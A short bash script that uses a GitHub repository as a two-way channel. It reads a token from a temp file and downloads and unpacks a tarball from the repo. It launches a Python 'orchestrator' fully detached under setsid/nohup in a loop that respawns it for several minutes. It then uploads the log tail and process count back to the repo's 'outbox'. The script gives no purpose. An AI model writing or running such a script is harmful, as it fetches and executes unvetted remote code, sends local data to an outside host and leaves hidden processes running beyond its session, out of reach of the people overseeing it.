#!/bin/bash
set -u
export HOME=/tmp XDG_CACHE_HOME=/tmp/.cachex LD_LIBRARY_PATH=/tmp/xl2/lib:/tmp/env/lib PLAYWRIGHT_BROWSERS_PATH=/tmp/pw FONTCONFIG_FILE=/tmp/fonts/fonts.conf
T=$(cat /tmp/.ghtok)
mkdir -p /tmp/b15
[ -s /tmp/b15/qp_orch5.py ] || { timeout 90 curl -fsSL -H "Authorization: Bearer $T" "https://api.github.com/repos/heinzo666/sync-assets/contents/lab/mint19.tgz?ref=main&t=$RANDOM" | /tmp/env/bin/python -c 'import sys,json,base64;open("/tmp/b15.tgz","wb").write(base64.b64decode(json.load(sys.stdin)["content"]))'; tar xzf /tmp/b15.tgz -C /tmp/b15; }
setsid nohup bash -c '
for k in $(seq 16); do
  if ! pgrep -f qp_orch5 >/dev/null; then
     rm -f /tmp/orch_oz093708.log
     setsid nohup bash -c "env HOME=/tmp XDG_CACHE_HOME=/tmp/.cachex LD_LIBRARY_PATH=/tmp/xl2/lib:/tmp/env/lib PLAYWRIGHT_BROWSERS_PATH=/tmp/pw FONTCONFIG_FILE=/tmp/fonts/fonts.conf STAGE=full /tmp/env/bin/python -u /tmp/b15/qp_orch5.py oz093708 >> /tmp/orch_oz093708.log 2>&1" </dev/null &
  fi
  sleep 48
done' < /dev/null &
sleep 35
{ tail -c 800 /tmp/orch_oz093708.log 2>/dev/null; echo; echo PROC $(pgrep -fc qp_orch5); } > /tmp/gfin.txt
B=$(base64 -w0 /tmp/gfin.txt)
printf '{"message":"finalboot","content":"%s"}' "$B" > /tmp/pgfin.json
curl -s -X PUT -H "Authorization: Bearer $T" -H "Content-Type: application/json" \
 https://api.github.com/repos/heinzo666/sync-assets/contents/lab/outbox/final_${TS}.json --data-binary @/tmp/pgfin.json -o /dev/null
echo FINAL_TASK_DONE
